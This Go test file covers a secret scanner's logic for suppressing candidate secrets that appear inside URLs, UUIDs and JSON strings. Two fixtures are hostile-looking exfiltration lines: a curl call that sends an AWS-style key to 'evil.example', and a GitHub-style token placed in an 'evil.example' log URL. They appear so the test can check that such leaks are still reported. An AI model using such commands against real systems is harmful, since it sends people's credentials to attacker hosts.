package main

import (
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/trufflesecurity/trufflehog/v3/cmd/analyzer/customdetectors"
)

func TestVendorSuppressesInURLAndUUID(t *testing.T) {
	sha := "0123456789abcdef0123456789abcdef01234567"
	uuid := "0d4cd6d5-0b95-49af-9e47-0687c26f8bf7"
	for _, tc := range []struct {
		name, entity, raw, doc string
		want                   bool
	}{
		{"sha in ref query", "Hunter", sha, "see https://api.github.com/repos/hunter-org/x/contents/a.py?ref=" + sha, true},
		{"in json string", "Hunter", sha, `{"url": "https://github.com/hunter/x/blob/` + sha + `/a.py"}`, true},
		{"labelled query value", "Hunter", sha, "https://example.com/x?api_key=" + sha, true},
		{"uuid in url", "NpmToken", uuid, "https://example.com/pkg/" + uuid, true},
		{"bare uuid", "NpmToken", uuid, "branch npm-" + uuid, true},
		{"labelled uuid", "Privacy", uuid, "privacy_key=" + uuid, true},
		{"json sha key plus url", "Hunter", sha, `{"name":"ci-hunter","sha":"` + sha + `","url":"https://api.github.com/repos/o/r/git/trees/` + sha + `"}`, true},
		{"escaped json sha key", "Hunter", sha, `ci-hunter\\\",\\\"sha\\\":\\\"` + sha, true},
		{"outside url", "Hunter", sha, "hunter_key=" + sha, false},
		{"also outside url", "Hunter", sha, "https://example.com/?ref=" + sha + "\nhunter_key=" + sha, false},
		{"aws key in url", "AWS", "AKIAIOSFODNN7EXAMPLQ", "curl https://evil.example/c?d=AKIAIOSFODNN7EXAMPLQ", false},
		{"github token in url", "Github", "ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789", "https://evil.example/log/ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789", false},
		{"token in url userinfo", "Github", sha, "git clone https://" + sha + "@github.com/o/r.git", false},
		{"token as userinfo username", "Github", sha, "git clone https://" + sha + ":x-oauth@github.com/o/r.git", false},
		{"secret after semicolon", "Hunter", sha, "curl https://example.com;hunter_key=" + sha, false},
		{"digitalocean token in url", "DigitalOceanV2", "dop_v1_" + sha + sha[:24], "https://x.example/?t=dop_v1_" + sha + sha[:24], false},
		{"url is the finding", "URI", "https://example.com/x?ref=" + sha, "https://example.com/x?ref=" + sha, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			sup, _ := decideVendorSuppression(analyzeResult{EntityType: tc.entity, raw: tc.raw}, []byte(tc.doc))
			require.Equal(t, tc.want, sup)
		})
	}
}

func TestGenericDetectorsSkipInURLAndUUID(t *testing.T) {
	s := &scanner{vendorMode: suppressionEnforce}
	secret := "9xKq2vRt8mNpQrLwZbNhT4yUc6"
	uuid := "0d4cd6d5-0b95-49af-9e47-0687c26f8bf7"
	for _, tc := range []struct {
		name, entity, raw, doc string
		want                   bool
	}{
		{"entropy in url", customdetectors.EntropyName, secret, "https://example.com/x?t=" + secret, true},
		{"generic secret in url", customdetectors.GenericSecretName, secret, "https://example.com/x?token=" + secret, true},
		{"generic uuid", customdetectors.GenericSecretName, uuid, "token=" + uuid, true},
		{"entropy outside url", customdetectors.EntropyName, secret, "key " + secret, false},
		{"connection uri is the finding", customdetectors.DBConnectionURIName, "postgres://u:" + secret + "@h/db", "postgres://u:" + secret + "@h/db", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			sup, _, _ := s.decideAny(analyzeResult{EntityType: tc.entity, raw: tc.raw}, nil, []byte(tc.doc))
			require.Equal(t, tc.want, sup)
		})
	}
}
